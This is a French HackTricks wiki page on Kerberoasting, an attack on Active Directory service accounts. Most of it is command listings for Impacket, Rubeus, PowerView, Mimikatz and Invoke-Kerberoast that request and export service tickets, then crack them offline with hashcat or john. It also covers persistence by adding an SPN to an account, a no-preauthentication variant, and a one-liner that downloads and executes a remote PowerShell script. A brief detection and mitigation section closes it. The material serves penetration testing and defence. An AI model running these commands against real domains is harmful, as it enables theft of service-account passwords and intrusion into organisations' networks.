# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** avec les outils communautaires **les plus avancés** au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Kerberoast

L'objectif du **Kerberoasting** est de collecter des **tickets TGS pour des services qui fonctionnent au nom de comptes utilisateurs** dans l'AD, et non de comptes d'ordinateurs. Ainsi, une **partie** de ces tickets TGS est **chiffrée** avec des **clés** dérivées des mots de passe des utilisateurs. Par conséquent, leurs identifiants pourraient être **crackés hors ligne**.\
Vous pouvez savoir qu'un **compte utilisateur** est utilisé comme un **service** car la propriété **"ServicePrincipalName"** est **non nulle**.

Par conséquent, pour effectuer un Kerberoasting, seul un compte de domaine capable de demander des TGS est nécessaire, ce qui est le cas de n'importe qui puisqu'aucun privilège spécial n'est requis.

**Vous avez besoin de justificatifs valides à l'intérieur du domaine.**

### **Attaque**

{% hint style="warning" %}
Les outils de **Kerberoasting** demandent généralement un **chiffrement `RC4`** lors de l'exécution de l'attaque et de l'initiation des requêtes TGS-REQ. Cela est dû au fait que le **RC4 est** [**plus faible**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) et plus facile à cracker hors ligne avec des outils tels que Hashcat que d'autres algorithmes de chiffrement tels que AES-128 et AES-256.\
Les hachages RC4 (type 23) commencent par **`$krb5tgs$23$*`** tandis que ceux de AES-256(type 18) commencent par **`$krb5tgs$18$*`**`.`
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Outils multi-fonctions incluant un dump des utilisateurs pouvant être soumis à Kerberoast :
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Énumérer les utilisateurs pouvant être soumis à Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Technique 1 : Demander un TGS et le vider de la mémoire**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Technique 2 : Outils automatiques**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Lorsqu'un TGS est demandé, l'événement Windows `4769 - Un ticket de service Kerberos a été demandé` est généré.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser des workflows** facilement, alimentés par les outils communautaires **les plus avancés**.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistance

Si vous avez **assez de permissions** sur un utilisateur, vous pouvez le rendre **kerberoastable** :
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Vous pouvez trouver des **outils** utiles pour les attaques **kerberoast** ici : [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Si vous rencontrez cette **erreur** depuis Linux : **`Kerberos SessionError: KRB_AP_ERR_SKEW(L'écart d'horloge est trop grand)`**, c'est à cause de votre heure locale, vous devez synchroniser l'hôte avec le DC. Il y a quelques options :

* `ntpdate <IP du DC>` - Obsolète depuis Ubuntu 16.04
* `rdate -n <IP du DC>`

### Atténuation

Kerberoast est très discret si exploitable

* ID d'événement de sécurité 4769 – Un ticket Kerberos a été demandé
* Comme l'ID 4769 est très fréquent, filtrons les résultats :
* Le nom du service ne doit pas être krbtgt
* Le nom du service ne doit pas se terminer par $ (pour filtrer les comptes de machines utilisés pour les services)
* Le nom du compte ne doit pas être machine@domain (pour filtrer les demandes provenant des machines)
* Le code d'échec est '0x0' (pour filtrer les échecs, 0x0 est un succès)
* Plus important encore, le type de chiffrement du ticket est 0x17
* Atténuation :
* Les mots de passe des comptes de service doivent être difficiles à deviner (plus de 25 caractères)
* Utiliser des comptes de service gérés (changement automatique de mot de passe périodiquement et gestion déléguée du SPN)
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
## Kerberoast sans compte de domaine

En septembre 2022, une vulnérabilité a été découverte par [Charlie Clark](https://exploit.ph/), les ST (Service Tickets) peuvent être obtenus via une requête KRB\_AS\_REQ sans avoir à contrôler un compte Active Directory. Si un principal peut s'authentifier sans pré-authentification (comme l'attaque AS-REP Roasting), il est possible de l'utiliser pour lancer une requête **KRB\_AS\_REQ** et tromper la requête pour demander un **ST** au lieu d'un **TGT chiffré**, en modifiant l'attribut **sname** dans la partie req-body de la requête.

La technique est entièrement expliquée dans cet article : [article de blog Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Vous devez fournir une liste d'utilisateurs car nous n'avons pas de compte valide pour interroger le LDAP en utilisant cette technique.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py de PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus du PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
**Plus d'informations sur le Kerberoasting sur ired.team** [**ici**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting) **et** [**là**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**.**

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser des workflows** facilement, alimentés par les outils communautaires **les plus avancés**.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
